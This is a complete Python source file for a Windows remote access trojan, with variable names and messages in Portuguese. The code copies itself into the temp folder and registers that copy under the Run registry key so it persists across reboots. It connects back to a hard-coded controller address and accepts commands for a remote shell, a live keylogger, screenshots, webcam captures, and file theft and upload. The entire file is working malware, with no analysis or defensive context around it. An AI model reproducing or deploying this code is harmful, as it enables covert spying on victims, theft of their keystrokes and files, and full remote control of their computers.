import keyboard
from cryptography.fernet import Fernet
import socket, time
import threading
import json, os
import subprocess
import base64
from PIL import ImageGrab
import datetime
import io
import cv2
import shutil
import tempfile
import sys
import winreg


def autorun():
    if getattr(sys, "frozen", False):
        scriptpath = os.path.realpath(sys.executable)
    else:
        scriptpath = os.path.realpath(__file__)

    temppath = tempfile.gettempdir()
    caminho = os.path.join(temppath, os.path.basename(scriptpath))

    try:
        shutil.copy(scriptpath, temppath)

        subchave = r"Software\Microsoft\Windows\CurrentVersion\Run"
        nome = "RATDOBEM"

        registro = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subchave, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(registro, nome, 0, winreg.REG_SZ, caminho)
    except shutil.SameFileError:
        None

def camShot(sock):
    cam = cv2.VideoCapture(0)

    if not cam.isOpened():
        sendData("alerta", "Erro ao abrir a camera", sock)

    else:
        sucess, raw_data = cam.read()
        if sucess:
            sucess, data = cv2.imencode(".jpg", raw_data)
            if sucess:
                date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                filename = f"webcam-{date}.jpg"
                imageData = data.tobytes()
                sendFile(filename, imageData, sock)

            else:
                sendData("alerta", "Erro ao codificar imagem", sock)

        else:
            sendData("alerta", "Erro ao capturar imagem", sock)

    cam.release()

def screenshot(sock):
    date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot-{date}.jpg"

    buffer = io.BytesIO()

    screenshot = ImageGrab.grab()
    screenshot.save(buffer, format="JPEG")

    data = buffer.getvalue()
    buffer.close()

    sendFile(filename, data, sock)
    
def encrypt(data):
    fernet = Fernet(aeskey)
    enc_data = fernet.encrypt(data.encode())

    return enc_data

def sendFile(filename, data, sock):
    b64data = base64.b64encode(data).decode()
    packet = json.dumps({"download":{filename:b64data}})
    enc_packet = encrypt(packet)
    sock.sendall(enc_packet)

def download(comando, sock):
    file = comando[9:]
    caminho = f"{pwd}/{file}"
    caminho = caminho.replace("\\", "/").replace("C:", "")

    if os.path.isfile(caminho):
        with open(caminho, "rb") as f:
            data = f.read()
            sendFile(file, data, sock)

    
def runcommand(command, sock):
    global pwd
    if command[:3] == "cd ":
        result = subprocess.run(command + " && cd", shell=True, text=True, capture_output=True, cwd=pwd)
        saida = result.stdout
        erro = result.stderr
        
        if saida != "":
            pwd = saida.strip()
            
        elif erro != "":
            sendData("comando", erro, sock)

    else:
        result = subprocess.run(command, shell=True, text=True, capture_output=True, cwd=pwd)
        saida = result.stdout
        erro = result.stderr

        if saida != "":
            sendData("comando", saida, sock)
            
        elif erro != "":
            sendData("comando", erro, sock)

def keylogger(sock):
    def evento(e):
        if e.event_type == keyboard.KEY_DOWN:
            try:
                tecla = e.name
                sendData("tecla", tecla, sock)

            except ConnectionAbortedError:
                monitorar = False
                keyboard.unhook_all()
            
    keyboard.hook(evento)
    while monitorar:
        pass

def sendData(key, data, sock):
    raw_packet = {key:data}
    packet = json.dumps(raw_packet)

    enc_packet = encrypt(packet)

    sock.send(enc_packet)
    
def recvData(sock):
    def decrypt(enc_data):
        try:
            fernet = Fernet(aeskey)

            data = fernet.decrypt(enc_data)
            return data    

        except:
            None
            
    global monitorar, pwd

    pwd = os.getcwd()
    monitorar = False
    
    while True:
        try:
            raw_data = sock.recv(1024)
        except ConnectionAbortedError:
            sock.close()
            break
        except ConnectionResetError:
            sock.close()
            break
        
        if raw_data:
            while True:
                try:
                    pacote = json.loads(decrypt(raw_data).decode())
                    break
                except:
                    raw_data += sock.recv(1024)
                    
            if "action" in pacote:
                comando = pacote["action"]
                
                if comando == "sk1":
                    monitorar = True
                    sendData("alerta", "Iniciando monitoramento ao vivo", sock)
                    t = threading.Thread(target=keylogger, args=(sock,))
                    t.start()

                elif comando == "sk0":
                    if monitorar == False:
                        sendData("alerta", "Monitorando não foi iniciado", sock)
                    else:
                        monitorar = False
                        sendData("alerta", "Parando monitoramento ao vivo", sock)
                        keyboard.unhook_all()

                elif comando == "exit":
                    sock.close()
                    break

                elif comando[:9] == "download ":
                    download(comando, sock)

                elif comando == "screenshot":
                    screenshot(sock)

                elif comando == "webcam":
                    camShot(sock)
                    
                else:
                    runcommand(comando, sock)

            elif "download" in pacote:
                downloadRcv = pacote["download"]
                caminho = pwd.replace("\\", "/").replace("C:", "")
                for file in downloadRcv:
                    with open(f"{caminho}/{file}", "wb") as f:
                        data = base64.b64decode(downloadRcv[file])
                        f.write(data)
                        
                sendData("alerta", f"Aquivo {file} enviado com sucesso", sock)
                

def try_connect():
    global aeskey
    while True:
        try:
            sock = socket.socket()
            sock.connect(("192.168.122.1", 8080))

            aeskey = Fernet.generate_key()
            data = json.dumps({"chave":aeskey.decode()})
            sock.send(data.encode())

            if sock.recv(4).decode() == "ok":
                return sock
            else:
                continue
            
        except:
            time.sleep(2)


autorun()
while True:
    sock = try_connect()            
    recvData(sock)
